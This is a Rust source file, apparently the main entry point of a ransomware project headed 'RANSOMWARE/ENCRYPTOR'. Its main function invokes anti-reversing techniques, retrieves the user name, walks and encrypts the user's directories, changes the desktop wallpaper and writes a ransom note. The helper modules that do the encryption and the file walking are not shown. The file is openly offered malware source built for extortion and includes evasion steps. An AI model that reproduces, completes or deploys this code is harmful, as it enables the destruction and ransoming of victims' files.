// ==========================================================================// 
//                            RANSOMWARE/ENCRYPTOR                           // 
// ==========================================================================// 

// ======================= IMPORTS ========================
use std::process::exit;

mod encryption;
mod utils;
mod walker;

// ======================= MAIN ========================
fn main() {
    // Anti-reversing techniques
    utils::anti_reversing();

    match walker::get_user_name() {
        Ok(result) => {
            let user = result.clone();
            walker::walk_and_encrypt_directories(result.into_bytes());
   
            // Change the wallpaper
            let _ = utils::change_wallpaper();

            // Write the ransom note
            let _ = walker::write_ransom_note(&user);
        }
        Err(_e) => {
            // If I can't get the user, close the program
            exit(1);
        }
    }
}
